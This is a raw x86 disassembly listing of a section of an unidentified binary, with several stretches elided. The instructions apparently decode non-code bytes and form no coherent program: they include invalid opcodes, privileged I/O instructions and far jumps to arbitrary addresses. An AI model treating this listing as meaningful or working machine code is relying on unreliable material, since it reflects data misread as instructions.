  41c5c9:	inc    ecx
  41c5ca:	cmp    al,BYTE PTR [eax]
  41c5cc:	clc    
  41c5cd:	nop
  41c5ce:	test   al,0x35
  41c5d0:	call   0x11ec:0x6ec549d7
  41c5d7:	sbb    al,0x17
  41c5d9:	sar    BYTE PTR [esi+0x5b],1
  41c5dc:	xchg   ecx,eax
  41c5dd:	xor    al,0xec
  41c5df:	cmc    
  41c5e0:	push   cs
  41c5e1:	mov    WORD PTR [ebx],?
  41c5e3:	arpl   sp,si
  41c5e5:	je     0x41c63b
  41c5e7:	test   BYTE PTR [esp+eax*1-0x3cabcaa9],cl
  41c5ee:	jmp    0x41c634
  41c5f0:	cmc    
  41c5f1:	xor    cl,BYTE PTR [eax]
  41c5f3:	jmp    0x765bc057
  41c5f8:	and    dh,BYTE PTR [ecx]
  41c5fa:	xor    ah,BYTE PTR [eax-0xdc83012]
  41c600:	fdiv   DWORD PTR [esi]
  41c602:	call   0x9234:0x4409ee68
  41c609:	pop    es
  41c60a:	shl    DWORD PTR [esi+0x6],0x12
  41c60e:	and    al,0x3c
  41c610:	jmp    0x355eccb9
  41c615:	xchg   DWORD PTR [edi+0x79561f02],esp
  41c61b:	cld    
  41c61c:	imul   eax,edx,0x594cc67e
  41c622:	sub    cl,al
  41c624:	lea    ebp,[ebp+0x43]
  41c627:	retf   
  41c628:	call   0x5b06:0x46f8ecb9
  41c62f:	dec    esp
  41c630:	cmp    edx,esp
  41c632:	hlt    
  41c633:	rol    al,0x26
  41c636:	in     eax,dx
  41c637:	fimul  WORD PTR [ebx+0x7246af64]
  41c63d:	aad    0x21
  41c63f:	call   0xc71cbdd9
  41c644:	(bad)  
  41c645:	lea    ebp,[esi+0x7ceb5ed6]
  41c64b:	ds loope 0x41c64b
  41c64e:	push   edi
  41c64f:	fcos   
  41c651:	(bad)  
  41c653:	out    0x3f,al
  41c655:	cld    
  41c656:	push   ebp
  41c657:	out    dx,al
  41c658:	outs   dx,BYTE PTR ds:[esi]
  41c659:	ja     0x41c684
  41c65b:	mov    eax,0x6e3f2e11
  41c660:	call   0xf4a46972
  41c665:	sbb    DWORD PTR [ebx],0x91679a9f
  41c66b:	jmp    0x41c607
  41c66d:	cmp    esp,DWORD PTR [ebx+0x69]
  41c670:	lock xor al,0x6a
  41c673:	xchg   edx,eax
  41c674:	ficomp DWORD PTR [eax-0x7ef7a280]
  41c67a:	inc    edi
  41c67b:	fiadd  DWORD PTR [eax-0x233786df]
  41c681:	adc    DWORD PTR [esi],esi
  41c683:	cmc    
  41c684:	jmp    0x41c6c7
  41c686:	shl    BYTE PTR [eax+0x277ae9af],1
  41c68c:	pop    esp
  41c68d:	cli    
  41c68e:	into   
  41c68f:	mov    ecx,DWORD PTR [ecx+0x0]
  41c692:	mov    ecx,0xdabaf876
  41c697:	pop    es
  41c698:	and    eax,DWORD PTR [ecx-0x5d95840c]
  41c69e:	mov    ebx,0x6cf5f9e3
  41c6a3:	and    bl,BYTE PTR [edi]
  41c6a5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c6a6:	ss mov dh,0x2d
  41c6a9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c6aa:	pop    ebp
  41c6ab:	pushf  
  41c6ac:	ja     0x41c672
  41c6ae:	inc    ebp
  41c6af:	jp     0x41c6d2
  41c6b1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c6b2:	stc    
  41c6b3:	or     dl,BYTE PTR [esi+0x0]
	...
  41c716:	fiadd  DWORD PTR [ecx]
  41c718:	ret    0xdb86
  41c71b:	(bad)  
  41c71c:	ficomp WORD PTR [ebp+0x7e]
  41c71f:	cmp    BYTE PTR [ecx+0x13],dh
  41c722:	and    esp,DWORD PTR [edx+0x2c6a3536]
  41c728:	add    DWORD PTR [eax],eax
  41c72a:	pop    es
  41c72b:	add    DWORD PTR [eax],eax
  41c72d:	add    BYTE PTR [eax],bh
  41c72f:	cs mov al,es:0xf5ab6e38
  41c736:	mov    ds:0xb1858448,al
  41c73b:	(bad)  
  41c73c:	xchg   edx,eax
  41c73d:	daa    
  41c73e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c73f:	xchg   DWORD PTR [ebx-0x48],edx
  41c742:	imul   edi,esi,0x884f0664
  41c748:	jge    0x41c6e9
  41c74a:	xor    BYTE PTR [ebp+0x27],ah
  41c74d:	int3   
  41c74e:	push   cs
  41c74f:	outs   dx,DWORD PTR ds:[esi]
  41c750:	dec    ebx
  41c751:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c752:	jns    0x41c730
  41c754:	fs stos BYTE PTR es:[edi],al
  41c756:	inc    edx
  41c757:	xor    ebx,DWORD PTR [ebx-0x2079fd64]
  41c75d:	mov    ah,0xab
  41c75f:	jl     0x41c742
  41c761:	es pop esp
  41c763:	(bad)  
  41c764:	mov    dh,0xde
  41c766:	stc    
  41c767:	jae    0x41c73b
  41c769:	adc    eax,eax
  41c76b:	pusha  
  41c76c:	fcmovbe st,st(0)
  41c76e:	lea    ebx,[esi]
  41c770:	dec    edx
  41c771:	enter  0x7fc5,0x77
  41c775:	aad    0xaf
  41c777:	js     0x41c741
  41c779:	test   BYTE PTR es:[ebx],cl
  41c77c:	mov    cl,0xa3
  41c77e:	ins    BYTE PTR es:[edi],dx
  41c77f:	cmp    ebx,DWORD PTR [esi+0x2cef176]
  41c785:	mov    eax,DWORD PTR [ecx]
  41c787:	repnz fwait
  41c789:	(bad)  
  41c78a:	jmp    0xcec13390
  41c78f:	push   ss
  41c790:	int3   
  41c791:	mov    ch,0x77
  41c793:	jo     0x41c751
  41c795:	add    BYTE PTR [esi-0x53],0x0
  41c799:	xchg   DWORD PTR [ebx],ebx
  41c79b:	mov    dl,0x64
  41c79d:	push   ecx
  41c79e:	pop    esp
  41c79f:	mov    WORD PTR [edi-0x10575f72],ss
  41c7a5:	ret    
  41c7a6:	pop    eax
  41c7a7:	nop
  41c7a8:	mov    dl,0xa5
  41c7aa:	mov    cl,0xa3
  41c7ac:	aam    0x46
  41c7ae:	ss jbe 0x41c762
  41c7b1:	ins    BYTE PTR es:[edi],dx
  41c7b2:	arpl   WORD PTR [ebx+0x66c96e86],dx
  41c7b8:	loop   0x41c7d7
  41c7ba:	fistp  QWORD PTR [eax]
  41c7bc:	push   0xe2d89fc
  41c7c1:	sub    eax,0x5e9c39c
  41c7c6:	test   al,0x52
  41c7c8:	aam    0x90
  41c7ca:	mov    ecx,0x81059711
  41c7cf:	jae    0x41c7fe
  41c7d1:	call   FWORD PTR ds:[ecx-0x193f106d]
  41c7d8:	dec    ecx
  41c7d9:	aas    
  41c7da:	sub    al,0x71
  41c7dc:	mov    dh,0x52
  41c7de:	push   cs
  41c7df:	sub    DWORD PTR [edi+0x50],0x0
  41c7e3:	dec    edx
  41c7e4:	fcom   QWORD PTR [eax]
  41c7e6:	or     eax,0x545666a2
  41c7eb:	sbb    DWORD PTR [ebx+0x39be579c],edi
  41c7f1:	or     al,0x48
  41c7f3:	xchg   ebx,eax
  41c7f4:	rcr    DWORD PTR [ebx+0x4f3e5c2c],0xa9
  41c7fb:	mov    WORD PTR [ecx],?
  41c7fd:	int    0x4e
  41c7ff:	inc    edx
  41c800:	popa   
  41c801:	pop    ecx
  41c802:	sbb    DWORD PTR [ebx+0x5],0x3053c391
  41c809:	gs mov dh,0x1
  41c80c:	enter  0xb688,0x5f
  41c810:	mov    edi,0x42c212be
  41c815:	bound  eax,QWORD PTR [edx]
  41c817:	inc    ebx
  41c818:	pusha  
  41c819:	repz call 0x8811:0xecbded49
  41c821:	mov    cl,0x5d
  41c823:	mov    ds,WORD PTR [ebx]
  41c825:	ret    
  41c826:	lock sub bh,BYTE PTR [ebp-0x38]
  41c82a:	cmp    bh,ah
  41c82c:	imul   esi,ecx,0x71
  41c82f:	adc    edi,DWORD PTR [ecx+0x7e47837e]
	...
  41c895:	add    BYTE PTR [ebx+0x34],ah
  41c898:	lods   eax,DWORD PTR ds:[esi]
  41c899:	xor    al,0xff
  41c89b:	mov    ebp,0x2e2377fb
  41c8a0:	js     0x41c910
  41c8a2:	or     DWORD PTR [ecx-0x3],0xffffffe6
  41c8a6:	jno    0x41c8d5
  41c8a8:	add    DWORD PTR [eax],eax
  41c8aa:	pop    es
  41c8ab:	add    DWORD PTR [eax],eax
  41c8ad:	add    BYTE PTR [esi+0x6effa164],bh
  41c8b3:	out    dx,eax
  41c8b4:	sub    eax,0xf193228a
  41c8b9:	and    dl,cl
  41c8bb:	dec    esp
  41c8bc:	fdivr  QWORD PTR [ebx-0x4cb9a4ce]
  41c8c2:	inc    ecx
  41c8c3:	mov    eax,0x84db4752
  41c8c8:	arpl   dx,bx
  41c8ca:	cmp    eax,esp
  41c8cc:	xor    eax,ebp
  41c8ce:	push   edi
  41c8cf:	gs out dx,al
  41c8d1:	push   ds
  41c8d2:	mov    cl,0x94
  41c8d4:	cmp    DWORD PTR [eax+esi*4],edi
  41c8d7:	std    
  41c8d8:	shl    DWORD PTR [edi],1
  41c8da:	cmc    
  41c8db:	fstp   QWORD PTR [eax+0x5b]
  41c8de:	addr16 test al,0xf0
  41c8e1:	add    eax,0x5055216a
  41c8e6:	das    
  41c8e7:	xor    eax,0x8d46c521
  41c8ec:	push   edx
  41c8ed:	loop   0x41c8da
  41c8ef:	and    al,0x1c
  41c8f1:	es xor eax,0x9298822c
  41c8f7:	ds ret 
  41c8f9:	es loope 0x41c8ec
  41c8fc:	mov    ebx,0x57618af2
  41c901:	jecxz  0x41c96d
  41c903:	ja     0x41c8e5
  41c905:	sbb    DWORD PTR [ebx],eax
  41c907:	sar    DWORD PTR [edi+0x46e373f9],1
  41c90d:	xor    eax,0xf65bdf35
  41c912:	frstor [ebp+0x65]
  41c915:	xchg   ecx,eax
  41c916:	or     ecx,DWORD PTR [eax*1+0x5467f636]
  41c91d:	aas    
  41c91e:	hlt    
  41c91f:	pusha  
  41c920:	pusha  
  41c921:	out    dx,al
  41c922:	les    esp,FWORD PTR [edx-0x2f6ca141]
  41c928:	mov    edi,DWORD PTR [ebp-0x3e42428d]
  41c92e:	xchg   ecx,eax
  41c92f:	je     0x41c94f
  41c931:	jmp    0x41c909
  41c933:	aas    
  41c934:	inc    edx
  41c935:	push   ss
  41c936:	hlt    
  41c937:	xlat   BYTE PTR ds:[ebx]
  41c938:	in     al,0x4c
  41c93a:	shl    DWORD PTR [ebp-0x1e],1
  41c93d:	into   
  41c93e:	popa   
  41c93f:	mov    al,0x31
  41c941:	jmp    0x429923e7
  41c946:	ins    DWORD PTR es:[edi],dx
  41c947:	(bad)  
  41c948:	jne    0x41c96d
  41c94a:	call   0x38c4:0x61b1b298
  41c951:	mov    edx,DWORD PTR [ebx-0x39af8c2]
  41c957:	or     BYTE PTR [esi-0x4f9d6f9],ch
  41c95d:	dec    ecx
  41c95e:	out    dx,eax
  41c95f:	dec    esp
  41c960:	lahf   
  41c961:	mov    edi,0x9192c69
  41c966:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c967:	jle    0x41c9bf
  41c969:	add    DWORD PTR [eax+0x54],esp
  41c96c:	out    0xe0,al
  41c96e:	mov    edx,0x325255a
  41c973:	inc    esi
  41c974:	xchg   ch,cl
  41c976:	push   ss
  41c977:	imul   BYTE PTR [esi+0x47]
  41c97a:	mov    ds:0x225f87fd,eax
  41c97f:	lods   al,BYTE PTR ds:[esi]
  41c980:	test   ah,bl
  41c982:	stos   DWORD PTR es:[edi],eax
  41c983:	fsubr  QWORD PTR [si-0x420]
  41c988:	daa    
  41c989:	scas   al,BYTE PTR es:[edi]
  41c98a:	fiadd  DWORD PTR [eax-0x6e]
  41c98d:	pop    eax
  41c98e:	popa   
  41c98f:	push   es
  41c990:	dec    ebp
  41c991:	(bad)  
  41c992:	test   al,0xdd
  41c994:	add    ah,bl
  41c996:	sub    ebx,DWORD PTR [edi+0x7]
  41c999:	mov    ecx,0x4398fbc4
  41c99e:	jl     0x41c96d
  41c9a0:	cmp    al,0x8e
  41c9a2:	inc    esi
  41c9a3:	push   esp
  41c9a4:	test   BYTE PTR [ebx-0x2b],cl
  41c9a7:	or     ch,cl
  41c9a9:	gs xor eax,0xcb0a9efd
  41c9af:	rcl    BYTE PTR [ebx],1
  41c9b1:	xchg   ebx,eax
  41c9b2:	and    cl,bl
  41c9b4:	lods   al,BYTE PTR ds:[esi]
	...
  41ca15:	add    al,dh
  41ca17:	retf   0xfc94
  41ca1a:	mov    esi,0x1bcef8fe
  41ca1f:	sub    al,bl
  41ca21:	test   eax,0x605f380f
  41ca26:	js     0x41ca56
  41ca28:	add    DWORD PTR [eax],eax
  41ca2a:	pop    es
  41ca2b:	add    DWORD PTR [eax],eax
  41ca2d:	add    BYTE PTR [ecx],bl
  41ca2f:	pop    esp
  41ca30:	call   0x3419:0xf894f620
  41ca37:	rcl    BYTE PTR [edi+0x62],cl
  41ca3a:	jmp    0x41ca3c
  41ca3c:	pop    esi
  41ca3d:	push   0xfa7b1634
  41ca42:	dec    edi
  41ca43:	adc    al,0x1c
  41ca45:	mov    ds:0x18556ee5,al
  41ca4a:	sbb    bh,al
  41ca4c:	mov    ecx,eax
  41ca4e:	fistp  QWORD PTR [eax+0x59]
  41ca51:	lea    edx,[ecx+0x13fe1163]
  41ca57:	repnz mov dh,dl
  41ca5a:	test   BYTE PTR ss:[esi],ch
  41ca5d:	mov    ch,0x91
  41ca5f:	push   0xa9e8c8e8
  41ca64:	cmp    cl,al
  41ca66:	jae    0x41ca19
  41ca68:	wbinvd 
  41ca6a:	daa    
  41ca6b:	mov    bl,0xc7
  41ca6d:	sub    cl,BYTE PTR [edx+0x62]
  41ca70:	mov    gs,WORD PTR [ecx+0xe2f6327]
  41ca76:	jmp    0x41ca77
  41ca78:	jbe    0x41cada
  41ca7a:	xlat   BYTE PTR ds:[ebx]
  41ca7b:	mov    esi,0x2f7ed9b9
  41ca80:	sbb    bh,BYTE PTR [ebp+0x3b64765e]
  41ca86:	jle    0x41ca3d
  41ca88:	jae    0x41cab1
  41ca8a:	icebp  
  41ca8b:	push   cs
  41ca8c:	and    al,0xf2
  41ca8e:	xor    BYTE PTR [edx-0x77],0xb9
  41ca92:	in     eax,0x2d
  41ca94:	dec    ecx
  41ca95:	imul   ebp,DWORD PTR [edx-0x4ec1c867],0xa6c5d52
  41ca9f:	mov    ecx,0x65930c23
  41caa4:	cld    
  41caa5:	ror    BYTE PTR [ebp+0x6c910a18],1
  41caab:	je     0x41ca7b
  41caad:	jge    0x41ca3f
  41caaf:	cmp    DWORD PTR [edi-0x255e4da7],0x9703b5a9
  41cab9:	imul   ecx,DWORD PTR [ebx-0x3d],0x6e
  41cabd:	xlat   BYTE PTR ds:[ebx]
  41cabe:	loopne 0x41ca85
  41cac0:	and    ch,BYTE PTR [eax]
  41cac2:	push   cs
  41cac3:	test   al,0x93
  41cac5:	ss gs in eax,dx
  41cac8:	out    dx,eax
  41cac9:	mov    ah,0x4c
  41cacb:	or     eax,DWORD PTR [edx]
  41cacd:	jb     0xb2a74223
  41cad3:	cmp    BYTE PTR [edi-0x54],dl
  41cad6:	xor    al,0xd
  41cad8:	pop    edi
  41cad9:	mov    bl,0x36
  41cadb:	jmp    0x3699:0xf9f9b2d0
  41cae2:	lahf   
  41cae3:	cwde   
  41cae4:	xlat   BYTE PTR ds:[ebx]
  41cae5:	arpl   WORD PTR [edx+eax*1],ax
  41cae8:	jp     0x41ca7e
  41caea:	jecxz  0x41ca79
  41caec:	pop    esp
  41caed:	sub    ch,BYTE PTR [ecx+0x5a3bb860]
  41caf3:	add    eax,0xb3bbbb4d
  41caf8:	cdq    
  41caf9:	push   es
  41cafa:	pop    esi
  41cafb:	lahf   
  41cafc:	cmp    esp,DWORD PTR [ecx+0x4e]
  41caff:	test   esi,eax
  41cb01:	mov    ecx,0x13da0a76
  41cb06:	jmp    0x281eb4fe
  41cb0b:	xor    eax,0x3bd1939d
  41cb10:	push   cs
  41cb11:	fimul  DWORD PTR [edx]
  41cb13:	xchg   ebp,eax
  41cb14:	pop    edx
  41cb15:	and    al,BYTE PTR [ebx]
  41cb17:	jb     0x41caa7
  41cb19:	stos   BYTE PTR es:[edi],al
  41cb1a:	and    ebp,DWORD PTR [eax+0x2ac7998]
  41cb20:	jmp    0x41cb98
  41cb22:	leave  
  41cb23:	into   
  41cb24:	pop    es
  41cb25:	int3   
  41cb26:	push   es
  41cb27:	mov    bl,0x6b
  41cb29:	pushf  
  41cb2a:	xor    eax,0xb709de4e
  41cb2f:	and    ah,dh
  41cb31:	imul   ecx,DWORD PTR [edx+ecx*4+0xc4],0x0
	...
  41cb95:	add    BYTE PTR [ecx],ch
  41cb97:	(bad)  
  41cb98:	sti    
  41cb99:	pop    ebp
  41cb9a:	(bad)  
  41cb9b:	jge    0x41cb4c
  41cb9d:	div    BYTE PTR [esi-0x193dc3b4]
  41cba3:	jbe    0x41cba8
  41cba5:	ins    DWORD PTR es:[edi],dx
  41cba6:	jg     0x41cbd7
  41cba8:	add    DWORD PTR [eax],eax
  41cbaa:	pop    es
  41cbab:	add    DWORD PTR [eax],eax
  41cbad:	add    BYTE PTR [ebx],bh
  41cbaf:	ret    
  41cbb0:	mov    ds:0x8f445f33,al
  41cbb5:	sbb    eax,0xc457c22
  41cbba:	jg     0x41cbba
  41cbbc:	sub    ah,BYTE PTR [esi]
  41cbbe:	mov    eax,ds:0xe155b552
  41cbc3:	dec    esi
  41cbc4:	test   DWORD PTR [edx],ebp
  41cbc6:	jmp    0x83a2569
  41cbcb:	push   esp
  41cbcc:	in     al,0x5c
  41cbce:	sbb    DWORD PTR [edi-0x77118a5e],ecx
  41cbd4:	sub    cl,BYTE PTR [edx-0x5f]
  41cbd7:	mov    fs,WORD PTR [edx+0x4b40dfe8]
  41cbdd:	cs push edi
  41cbdf:	cmp    cl,dh
  41cbe1:	push   esi
  41cbe2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cbe3:	and    eax,0x8330730e
  41cbe8:	dec    ebp
  41cbe9:	cmp    esi,edx
  41cbeb:	cld    
  41cbec:	dec    ebp
  41cbed:	int3   
  41cbee:	loop   0x41cc1e
  41cbf0:	dec    edi
  41cbf1:	or     al,0x65
  41cbf3:	lea    esi,[edx]
  41cbf5:	outs   dx,DWORD PTR ds:[esi]
  41cbf6:	jnp    0x41cc49
  41cbf8:	dec    esp
  41cbf9:	xchg   ecx,eax
  41cbfa:	leave  
  41cbfb:	sbb    ebx,DWORD PTR [ebx]
  41cbfd:	cmp    eax,0x19d53eac
  41cc02:	adc    eax,0xc5ff433b
  41cc07:	mov    ch,BYTE PTR [eax-0x80]
  41cc0a:	outs   dx,BYTE PTR ds:[esi]
  41cc0b:	mov    ah,0x8e
  41cc0d:	call   FWORD PTR [ebp-0xb]
  41cc10:	inc    ebp
  41cc11:	pop    es
  41cc12:	xor    al,0xed
  41cc14:	sub    ch,BYTE PTR [eax]
  41cc16:	sub    al,0x25
  41cc18:	icebp  
  41cc19:	mov    ebx,0xdfd9af8f
  41cc1e:	sbb    eax,0xff27c8cf
  41cc23:	and    DWORD PTR [edx+0x7e],ecx
  41cc26:	ins    DWORD PTR es:[edi],dx
  41cc27:	scas   al,BYTE PTR es:[edi]
  41cc28:	adc    al,0xc3
  41cc2a:	out    0x3d,al
  41cc2c:	mov    ch,0xf5
  41cc2e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cc2f:	add    BYTE PTR es:[edi],ch
  41cc32:	sbb    DWORD PTR [edx+eiz*2-0x70],edi
  41cc36:	call   0x6a51:0xcfeab150
  41cc3d:	xchg   esp,eax
  41cc3e:	int    0x80
  41cc40:	sbb    eax,0xd305f915
  41cc45:	xchg   ebx,eax
  41cc46:	mov    edi,0xcd0207c3
  41cc4b:	(bad)  
  41cc4c:	sbb    eax,0x532ec94
  41cc51:	jns    0x41cc29
  41cc53:	aas    
  41cc54:	xchg   ebx,eax
  41cc55:	(bad)  
  41cc56:	jecxz  0x41cbfa
  41cc58:	les    esp,FWORD PTR ds:0xb05fb3ff
  41cc5e:	mov    ch,0xd2
  41cc60:	sti    
  41cc61:	mov    dh,0x43
  41cc63:	sahf   
  41cc64:	jmp    0x121b:0x6c94967f
  41cc6b:	outs   dx,BYTE PTR ds:[esi]
  41cc6c:	and    edi,esp
  41cc6e:	jmp    0x41cc32
  41cc70:	scas   eax,DWORD PTR es:[edi]
  41cc71:	or     al,0x8b
  41cc73:	arpl   WORD PTR [eax],ax
  41cc75:	mov    ds:0x40efdcea,eax
  41cc7a:	test   DWORD PTR [ecx+0x78],esi
  41cc7d:	pop    ebx
  41cc7e:	sahf   
  41cc7f:	and    bl,BYTE PTR [esi]
  41cc81:	and    bl,dl
  41cc83:	(bad)  
  41cc84:	xor    al,0x46
  41cc86:	outs   dx,DWORD PTR ds:[esi]
  41cc87:	int    0x73
  41cc89:	out    0x9b,eax
  41cc8b:	jmp    0x859a:0x319853ec
  41cc92:	push   cs
  41cc93:	add    DWORD PTR [ebp-0x71cc57db],eax
  41cc99:	hlt    
  41cc9a:	xchg   edi,eax
  41cc9b:	nop
  41cc9c:	dec    esi
  41cc9d:	add    BYTE PTR [ebp-0x47],bl
  41cca0:	popa   
  41cca1:	mov    edx,0xbdeb8039
  41cca6:	and    eax,DWORD PTR [edi]
  41cca8:	iret   
  41cca9:	mov    ebp,0x3d73fa43
  41ccae:	jge    0x41cc66
  41ccb0:	(bad)  
  41ccb1:	and    dl,BYTE PTR [ebp+0x1cdd]
	...
  41cd13:	add    BYTE PTR [eax],al
  41cd15:	add    BYTE PTR [eax-0x67],ah
  41cd18:	fsubr  st(5),st
  41cd1a:	std    
  41cd1b:	in     eax,0x79
  41cd1d:	popf   
  41cd1e:	dec    ebx
  41cd1f:	int    0x76
  41cd21:	hlt    
  41cd22:	push   esi
  41cd23:	(bad)  
  41cd24:	mov    ebp,DWORD PTR [ebx]
  41cd26:	xchg   BYTE PTR [eax],dh
  41cd28:	add    DWORD PTR [eax],eax
  41cd2a:	pop    es
  41cd2b:	add    DWORD PTR [eax],eax
  41cd2d:	add    BYTE PTR [ebp+eiz*4-0x173ea9d0],bl
  41cd34:	push   ds
  41cd35:	gs cmp al,0x34
  41cd38:	or     esi,DWORD PTR [esi+0x75081709]
  41cd3e:	mov    ch,0x4e
  41cd40:	or     al,0x57
  41cd42:	jmp    0x5952d7eb
  41cd47:	stos   BYTE PTR es:[edi],al
  41cd48:	in     al,dx
  41cd49:	xlat   BYTE PTR ds:[ebx]
  41cd4a:	push   ecx
  41cd4b:	or     dl,ch
  41cd4d:	out    0x4d,eax
  41cd4f:	sbb    eax,0x167a8fdf
  41cd54:	push   ebp
  41cd55:	hlt    
  41cd56:	repz mov ebx,0x2e385da6
  41cd5c:	add    ecx,ebx
  41cd5e:	pop    esi
  41cd5f:	stos   DWORD PTR es:[edi],eax
  41cd60:	(bad)  
  41cd61:	je     0x41cdc6
  41cd63:	or     BYTE PTR [ebx],al
  41cd65:	or     BYTE PTR [ecx],dl
  41cd67:	xor    DWORD PTR [ebp-0x5d2dd646],eax
  41cd6d:	dec    edx
  41cd6e:	cmp    al,0x1
  41cd70:	mov    esi,DWORD PTR [eax]
  41cd72:	pop    ebp
  41cd73:	lods   al,BYTE PTR ds:[esi]
  41cd74:	imul   esi,DWORD PTR ds:0xa6e61540,0xc9260f96
  41cd7e:	adc    DWORD PTR [edx],esi
  41cd80:	call   0x5b12:0x9344b87
  41cd87:	or     al,0x23
  41cd89:	and    DWORD PTR [ecx+0x62],edx
  41cd8c:	or     BYTE PTR [eax],dh
  41cd8e:	jns    0x41cd4a
  41cd90:	pop    esi
  41cd91:	jne    0x41ce05
  41cd93:	jno    0x41ce09
  41cd95:	mov    BYTE PTR [eax-0x45],dh
  41cd98:	sti    
  41cd99:	lods   al,BYTE PTR ds:[esi]
  41cd9a:	(bad)  
  41cd9b:	sbb    eax,0x8f91fe4
  41cda0:	add    DWORD PTR [ecx+0x40],edx
  41cda3:	fild   DWORD PTR [ebp-0x5e1d0309]
  41cda9:	mov    dl,0xb5
  41cdab:	ror    BYTE PTR [edx],0x9b
  41cdae:	out    dx,eax
  41cdaf:	fcmovne st,st(7)
  41cdb1:	lock and al,0xa2
  41cdb4:	test   cl,0xb6
  41cdb7:	push   0x77fb332a
  41cdbc:	push   ebp
  41cdbd:	pop    ds
  41cdbe:	jmp    0x25b2:0x4b361e3
  41cdc5:	(bad)  
  41cdc6:	mov    ebp,0xb6908130
  41cdcb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cdcc:	fcom   QWORD PTR [eax-0x5a50be0e]
  41cdd2:	or     eax,0x7f8f2cc9
  41cdd7:	enter  0x540d,0x55
  41cddb:	popf   
  41cddc:	lea    ecx,[esi]
  41cdde:	pushf  
  41cddf:	test   BYTE PTR [eax+0x4ee1447a],dh
  41cde5:	mov    bl,0xf8
  41cde7:	sbb    eax,0x9c5d012e
  41cdec:	arpl   si,bx
  41cdee:	fsubr  QWORD PTR [esp+eax*8-0x1473f88e]
  41cdf5:	xchg   DWORD PTR [ecx],edi
  41cdf7:	fidiv  WORD PTR [ecx-0x3f9d6ab1]
  41cdfd:	or     BYTE PTR [ebx+0x17899787],cl
  41ce03:	fs mov ebp,0xd8b6e146
  41ce09:	retf   0x6a9b
  41ce0c:	mov    dh,0x42
  41ce0e:	dec    ecx
  41ce0f:	sbb    ecx,DWORD PTR [edx-0x29]
  41ce12:	aam    0x34
  41ce14:	cmp    eax,0x61d5f517
  41ce19:	ins    BYTE PTR es:[edi],dx
  41ce1a:	ss aaa 
  41ce1c:	add    ebp,DWORD PTR [esp+edi*4-0x7b]
  41ce20:	js     0x41ce98
  41ce22:	js     0x41cea0
  41ce24:	xor    esp,DWORD PTR [ecx+ebp*2]
  41ce27:	stc    
  41ce28:	rol    al,0xf4
  41ce2b:	add    ah,dl
  41ce2d:	inc    ebx
  41ce2e:	sbb    dl,BYTE PTR [eax+eax*4]
  41ce31:	add    al,0xf
  41ce33:	jae    0x41cdc8
	...
  41ce95:	add    BYTE PTR [edi],al
  41ce97:	jp     0x41ce81
  41ce99:	jnp    0x41ce98
  41ce9b:	sti    
  41ce9c:	xchg   edi,eax
  41ce9d:	jle    0x41ce2e
  41ce9f:	imul   esp,DWORD PTR [edx+0x5b],0xf99b30c1
  41cea6:	lea    esi,[ecx]
  41cea8:	add    DWORD PTR [eax],eax
  41ceaa:	pop    es
  41ceab:	add    DWORD PTR [eax],eax
  41cead:	add    BYTE PTR [edi],cl
  41ceaf:	sar    BYTE PTR [esi-0x7b],cl
  41ceb2:	mov    esp,0xc4a3d784
  41ceb7:	sbb    DWORD PTR [edi+esi*1],eax
  41ceba:	adc    cl,BYTE PTR [esi+0x8]
  41cebd:	pushf  
  41cebe:	inc    esi
  41cebf:	sbb    esi,DWORD PTR [ecx+ecx*2]
  41cec2:	sub    bl,BYTE PTR ds:0x5c041682
  41cec8:	es (bad) 
  41ceca:	repnz es popf 
  41cecd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cece:	push   es
  41cecf:	sub    edi,DWORD PTR [ecx+0x5f]
  41ced2:	mov    bl,0xcd
  41ced4:	and    esi,esi
  41ced6:	push   ss
  41ced7:	push   ebp
  41ced8:	mov    ebp,0x9661039
  41cedd:	mov    ds:0x75605a4e,eax
  41cee2:	jmp    0x41ceca
  41cee4:	dec    esp
  41cee5:	or     bh,al
  41cee7:	(bad)  
  41cee8:	sbb    al,0xa5
  41ceea:	or     dh,BYTE PTR [ecx-0x2d]
  41ceed:	push   0x3a
  41ceef:	and    ch,BYTE PTR ds:0x14aeaf01
  41cef5:	jno    0x41ced5
  41cef7:	mov    DWORD PTR [eax],ebp
  41cef9:	cmc    
  41cefa:	(bad)  [eax+0x7c5f817b]
  41cf00:	adc    ebp,edi
  41cf02:	dec    ecx
  41cf03:	ss out 0x34,eax
  41cf06:	inc    ecx
  41cf07:	mov    ecx,0x483143cc
  41cf0c:	cwde   
  41cf0d:	popf   
  41cf0e:	sbb    DWORD PTR [eax-0x55],0xffffffac
  41cf12:	lods   eax,DWORD PTR ds:[esi]
  41cf13:	mov    al,ds:0xdfdfee4e
  41cf18:	outs   dx,DWORD PTR ds:[esi]
  41cf19:	and    BYTE PTR [esi+0x4b],bl
  41cf1c:	mov    edi,0x857c9d39
  41cf21:	fimul  WORD PTR [esi]
  41cf23:	enter  0x8216,0xfa
  41cf27:	and    eax,0x1b789225
  41cf2c:	xchg   esp,eax
  41cf2d:	clc    
  41cf2e:	push   0xffffffac
  41cf30:	mov    ebx,0xd03ac207
  41cf35:	pop    edi
  41cf36:	neg    BYTE PTR [edx+0x2f6a0237]
  41cf3c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cf3d:	es gs or esi,0x36
  41cf42:	aas    
  41cf43:	push   cs
  41cf44:	adc    DWORD PTR [ebp-0x176c056a],edi
  41cf4a:	aad    0x83
  41cf4c:	xchg   BYTE PTR [ebp-0x718f1ef2],bh
  41cf52:	je     0x41cf01
  41cf54:	inc    ecx
  41cf55:	jle    0x41cf4c
  41cf57:	jb     0x41cedf
  41cf59:	xchg   esp,ebx
  41cf5b:	sahf   
  41cf5c:	out    dx,al
  41cf5d:	popa   
  41cf5e:	mov    al,ds:0xbd8a3ad0
  41cf63:	data16 sub ch,dl
  41cf66:	shl    DWORD PTR es:[ebx],1
  41cf69:	ins    DWORD PTR es:[edi],dx
  41cf6a:	ja     0x41cfb5
  41cf6c:	and    DWORD PTR [ecx+0x2a],edx
  41cf6f:	pop    ecx
  41cf70:	add    esp,esi
  41cf72:	imul   ebx,DWORD PTR [eax+edx*4+0x31],0x273a6c5f
